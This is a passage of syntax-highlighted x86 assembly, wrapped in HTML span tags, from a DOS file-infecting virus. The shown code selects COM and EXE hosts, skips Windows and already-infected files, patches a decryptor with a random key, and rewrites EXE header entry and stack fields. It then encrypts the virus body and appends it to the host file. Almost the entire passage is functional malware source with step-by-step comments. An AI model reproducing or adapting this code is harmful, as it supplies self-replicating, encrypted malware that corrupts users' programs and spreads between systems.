            </span><span class="sc6">je</span><span class="sc0">   </span><span class="sc5">NO_GOOD</span><span class="sc0">                                   </span><span class="sc1">;file ok .. infect</span><span class="sc0">
            </span><span class="sc6">jmp</span><span class="sc0">  </span><span class="sc9">short</span><span class="sc0">  </span><span class="sc5">INFECT_COM</span><span class="sc0">


</span><span class="sc5">CHECK_EXE</span><span class="sc4">:</span><span class="sc0">
            </span><span class="sc6">cmp</span><span class="sc0">  </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">START_CODE</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">VIRUS</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">18h</span><span class="sc4">],</span><span class="sc2">40h</span><span class="sc0">   </span><span class="sc1">;Windows file?</span><span class="sc0">
            </span><span class="sc6">je</span><span class="sc0">   </span><span class="sc5">NO_GOOD</span><span class="sc0">                                        </span><span class="sc1">;no? check com</span><span class="sc0">

            </span><span class="sc6">cmp</span><span class="sc0">  </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">START_CODE</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">VIRUS</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">01Ah</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">   </span><span class="sc1">;internal overlay</span><span class="sc0">
            </span><span class="sc6">jne</span><span class="sc0">  </span><span class="sc5">NO_GOOD</span><span class="sc0">                                       </span><span class="sc1">;yes? exit..</span><span class="sc0">

            </span><span class="sc6">cmp</span><span class="sc0">  </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">START_CODE</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">VIRUS</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">12h</span><span class="sc4">],</span><span class="sc5">ID</span><span class="sc0">   </span><span class="sc1">;already infected?</span><span class="sc0">
            </span><span class="sc6">je</span><span class="sc0">   </span><span class="sc5">NO_GOOD</span><span class="sc0">

</span><span class="sc5">INFECT_EXE</span><span class="sc4">:</span><span class="sc0">
             </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">COM_FLAG</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">VIRUS</span><span class="sc4">],</span><span class="sc2">01</span><span class="sc0">  </span><span class="sc1">;exe infection</span><span class="sc0">
             </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">SKIP</span><span class="sc0">

</span><span class="sc5">INFECT_COM</span><span class="sc4">:</span><span class="sc0">
             </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">COM_FLAG</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">VIRUS</span><span class="sc4">],</span><span class="sc2">00</span><span class="sc0">  </span><span class="sc1">;com infection</span><span class="sc0">

</span><span class="sc5">SKIP</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc1">;*********************</span><span class="sc0">
</span><span class="sc1">; 6-set PTR @EOF</span><span class="sc0">
</span><span class="sc1">;*********************</span><span class="sc0">

        </span><span class="sc6">xor</span><span class="sc0">  </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">                  </span><span class="sc1">;prepare to write virus on file</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">  </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">                  </span><span class="sc1">;position file pointer,cx:dx = 0</span><span class="sc0">
       </span><span class="sc1">;cwd                         ;position file pointer,cx:dx = 0</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4202H</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">  </span><span class="sc2">21h</span><span class="sc0">                    </span><span class="sc1">;locate pointer at end EOF DOS function</span><span class="sc0">

</span><span class="sc1">;*********************</span><span class="sc0">
</span><span class="sc1">; 7-Fix deCRYPTtor</span><span class="sc0">
</span><span class="sc1">;*********************</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">                                         </span><span class="sc1">;save file size (COM file, for EXE files</span><span class="sc0">
                                                        </span><span class="sc1">;this is redone later)</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">  </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">100h</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">DECRYPTOR_SIZE</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">WORK_BUFFER</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">VIRUS</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0"> </span><span class="sc1">;insert address</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc8">ax</span><span class="sc4">,(</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">FINAL</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">VIRUS</span><span class="sc4">)/</span><span class="sc2">2</span><span class="sc0">         </span><span class="sc1">;virus size in Words</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">WORK_BUFFER</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">VIRUS</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0"> </span><span class="sc1">;insert size</span><span class="sc0">

        </span><span class="sc6">in</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">                                    </span><span class="sc1">;get a random word in AX</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">  </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">in</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">   </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0813Ch</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">   </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">09249h</span><span class="sc0">
        </span><span class="sc6">rol</span><span class="sc0">   </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">ror</span><span class="sc0">   </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">WORK_BUFFER</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">VIRUS</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">9</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0"> </span><span class="sc1">;insert random KEY</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">  </span><span class="sc8">ax</span><span class="sc0">                                         </span><span class="sc1">;restore file size</span><span class="sc0">


        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">COM_FLAG</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">VIRUS</span><span class="sc4">],</span><span class="sc2">01</span><span class="sc0"> </span><span class="sc1">;exe file?</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">DO_COM</span><span class="sc0">

</span><span class="sc1">;*************************</span><span class="sc0">
</span><span class="sc1">; 8-FIX AND WRITE EXE HDR</span><span class="sc0">
</span><span class="sc1">;*************************</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">                                </span><span class="sc1">;save file handler</span><span class="sc0">

</span><span class="sc1">;-----------------------</span><span class="sc0">
</span><span class="sc1">; save CS:IP &amp; SS:SP</span><span class="sc0">
</span><span class="sc1">;-----------------------</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">cld</span><span class="sc0">                                    </span><span class="sc1">;clear direction flag</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,[</span><span class="sc8">si</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">ORIG_SSSP</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">VIRUS</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">;save original CS:IP at es:di</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,[</span><span class="sc8">si</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">START_CODE</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">VIRUS</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">14d</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;from ds:si</span><span class="sc0">
        </span><span class="sc6">movsw</span><span class="sc0">                                  </span><span class="sc1">;save ss</span><span class="sc0">
        </span><span class="sc6">movsw</span><span class="sc0">                                  </span><span class="sc1">;save sp</span><span class="sc0">

        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc2">02</span><span class="sc0">                              </span><span class="sc1">;save original SS:SP</span><span class="sc0">
        </span><span class="sc6">movsw</span><span class="sc0">                                  </span><span class="sc1">;save ip</span><span class="sc0">
        </span><span class="sc6">movsw</span><span class="sc0">                                  </span><span class="sc1">;save cs</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">

</span><span class="sc1">;-----------------------------</span><span class="sc0">
</span><span class="sc1">; calculate new CS:IP</span><span class="sc0">
</span><span class="sc1">;-----------------------------</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc4">[</span><span class="sc8">si</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">START_CODE</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">VIRUS</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;header size in paragraphs</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">04</span><span class="sc0">                                    </span><span class="sc1">;multiply by 16, won't work with headers &gt; 4096</span><span class="sc0">
        </span><span class="sc6">shl</span><span class="sc0">  </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">                                    </span><span class="sc1">;bx=header size</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">                                       </span><span class="sc1">;save file size at dx:ax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">

        </span><span class="sc6">sub</span><span class="sc0">  </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">                                    </span><span class="sc1">;file size - header size</span><span class="sc0">
        </span><span class="sc6">sbb</span><span class="sc0">  </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">0000h</span><span class="sc0">                                 </span><span class="sc1">;fix dx if carry, assures dx, ip &lt; 16</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">CALCULATE</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">START_CODE</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">VIRUS</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">12h</span><span class="sc4">],</span><span class="sc5">ID</span><span class="sc0">   </span><span class="sc1">;put ID in checksum slot</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">START_CODE</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">VIRUS</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">14h</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">   </span><span class="sc1">;IP</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">  </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc5">DECRYPTOR_SIZE</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">                           </span><span class="sc1">;insert new starting address</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">WORK_BUFFER</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">VIRUS</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">   </span><span class="sc1">;insert address on decryptor</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">START_CODE</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">VIRUS</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">16h</span><span class="sc4">],</span><span class="sc8">dx</span><span class="sc0">   </span><span class="sc1">;CS</span><span class="sc0">

</span><span class="sc1">;-----------------------------</span><span class="sc0">
</span><span class="sc1">; calculate &amp; fix new SS:SP</span><span class="sc0">
</span><span class="sc1">;-----------------------------</span><span class="sc0">

        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0"> </span><span class="sc1">;filelength in dx:ax</span><span class="sc0">

        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">FINAL</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">VIRUS</span><span class="sc0"> </span><span class="sc1">;add filesize to ax</span><span class="sc0">
        </span><span class="sc6">adc</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">0000h</span><span class="sc0">                       </span><span class="sc1">;fix dx if carry</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">  </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">   </span><span class="sc1">;if filesize + virus size is even then the stack size</span><span class="sc0">
        </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">01</span><span class="sc0">    </span><span class="sc1">;even or odd stack?</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">   </span><span class="sc5">EVENN</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">  </span><span class="sc8">ax</span><span class="sc0">       </span><span class="sc1">;make stack even</span><span class="sc0">
</span><span class="sc5">EVENN</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">CALCULATE</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">START_CODE</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">VIRUS</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">10h</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0"> </span><span class="sc1">;SP</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">START_CODE</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">VIRUS</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">0Eh</span><span class="sc4">],</span><span class="sc8">dx</span><span class="sc0"> </span><span class="sc1">;SS</span><span class="sc0">

</span><span class="sc1">;-----------------------------</span><span class="sc0">
</span><span class="sc1">; Calculate new file size</span><span class="sc0">
</span><span class="sc1">;-----------------------------</span><span class="sc0">

        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">  </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">0009h</span><span class="sc0">                       </span><span class="sc1">;2^9 = 512</span><span class="sc0">
        </span><span class="sc6">ror</span><span class="sc0">   </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">                          </span><span class="sc1">;/ 512 (sort of)</span><span class="sc0">
        </span><span class="sc6">shr</span><span class="sc0">   </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">                          </span><span class="sc1">;/ 512</span><span class="sc0">
        </span><span class="sc6">stc</span><span class="sc0">                                  </span><span class="sc1">;set carry flag</span><span class="sc0">
        </span><span class="sc6">adc</span><span class="sc0">   </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">                          </span><span class="sc1">;fix dx , page count</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">   </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0">   </span><span class="sc8">ch</span><span class="sc4">,</span><span class="sc2">0001h</span><span class="sc0">                       </span><span class="sc1">;mod 512</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">START_CODE</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">VIRUS</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc4">],</span><span class="sc8">dx</span><span class="sc0"> </span><span class="sc1">;page count</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">START_CODE</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">VIRUS</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">cx</span><span class="sc0"> </span><span class="sc1">;save remainder</span><span class="sc0">

        </span><span class="sc6">pop</span><span class="sc0">  </span><span class="sc8">bx</span><span class="sc0">      </span><span class="sc1">;restore file handle</span><span class="sc0">

</span><span class="sc5">DO_COM</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc1">;*********************</span><span class="sc0">
</span><span class="sc1">; 9-write deCRYPTor</span><span class="sc0">
</span><span class="sc1">;*********************</span><span class="sc0">

       </span><span class="sc6">lea</span><span class="sc0">   </span><span class="sc8">dx</span><span class="sc4">,[</span><span class="sc8">si</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">WORK_BUFFER</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">VIRUS</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">;write from here</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">DECRYPTOR_SIZE</span><span class="sc0">              </span><span class="sc1">;write # of bytes</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">                         </span><span class="sc1">;write to file bx=file handle</span><span class="sc0">
       </span><span class="sc6">int</span><span class="sc0">   </span><span class="sc2">21h</span><span class="sc0">                            </span><span class="sc1">;write from DS:DX</span><span class="sc0">

</span><span class="sc1">;*********************</span><span class="sc0">
</span><span class="sc1">; 10-enCRYPT virus</span><span class="sc0">
</span><span class="sc1">;*********************</span><span class="sc0">

       </span><span class="sc6">push</span><span class="sc0">  </span><span class="sc8">ds</span><span class="sc0">                                         </span><span class="sc1">;save DS</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0">  </span><span class="sc8">es</span><span class="sc0">                                         </span><span class="sc1">;save ES</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0A00h</span><span class="sc0">                                   </span><span class="sc1">;set up new ES (work) segment</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0">  </span><span class="sc8">ax</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0">   </span><span class="sc8">es</span><span class="sc0">                                         </span><span class="sc1">;ES=AX=0A00h</span><span class="sc0">
       </span><span class="sc6">xor</span><span class="sc0">   </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">                                      </span><span class="sc1">;DI=0</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc8">cx</span><span class="sc4">,(</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">FINAL</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">VIRUS</span><span class="sc4">)/</span><span class="sc2">2</span><span class="sc0">         </span><span class="sc1">;virus size cx= # words</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0">  </span><span class="sc8">si</span><span class="sc0">                                         </span><span class="sc1">;save SI</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">WORK_BUFFER</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">VIRUS</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">9</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;get Random KEY in DX</span><span class="sc0">

</span><span class="sc5">enCRYPT</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">lodsw</span><span class="sc0">          </span><span class="sc1">;word ptr ds:[si] =&gt; ax</span><span class="sc0">
       </span><span class="sc6">sub</span><span class="sc0">   </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">    </span><span class="sc1">;encrypt ax</span><span class="sc0">
       </span><span class="sc6">stosw</span><span class="sc0">          </span><span class="sc1">;ax =&gt; word ptr es:[di]</span><span class="sc0">
       </span><span class="sc6">loop</span><span class="sc0">  </span><span class="sc5">enCRYPT</span><span class="sc0">

       </span><span class="sc6">pop</span><span class="sc0">   </span><span class="sc8">si</span><span class="sc0">       </span><span class="sc1">;restore SI</span><span class="sc0">
       </span><span class="sc6">xor</span><span class="sc0">   </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">    </span><span class="sc1">;DX=0</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0">  </span><span class="sc8">es</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0">   </span><span class="sc8">ds</span><span class="sc0">       </span><span class="sc1">;DS=ES</span><span class="sc0">

</span><span class="sc1">;*********************</span><span class="sc0">
</span><span class="sc1">; 11-Write Virus</span><span class="sc0">
</span><span class="sc1">;*********************</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">FINAL</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">VIRUS</span><span class="sc0">      </span><span class="sc1">;write virus  cx= # bytes</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">                              </span><span class="sc1">;write to file bx=file handle</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">  </span><span class="sc2">21h</span><span class="sc0">                                 </span><span class="sc1">;write from DS:DX</span><span class="sc0">

        </span><span class="sc6">pop</span><span class="sc0">  </span><span class="sc8">es</span><span class="sc0">                                  </span><span class="sc1">;restore ES</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">  </span><span class="sc8">ds</span><span class="sc0">                                  </span><span class="sc1">;restore DS</span><span class="sc0">

</span><span class="sc1">;*********************</span><span class="sc0">
</span><span class="sc1">; 12-set PTR @BOF</span><span class="sc0">
</span><span class="sc1">;*********************</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4200h</span><span class="sc0">                            </span><span class="sc1">;locate pointer at beginning of</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">  </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">  </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">                               </span><span class="sc1">;position file pointer,cx:dx = 0</span><span class="sc0">
       </span><span class="sc1">;cwd                                      ;position file pointer,cx:dx = 0</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">  </span><span class="sc2">21h</span><span class="sc0">                                 </span><span class="sc1">;host file</span><span class="sc0">

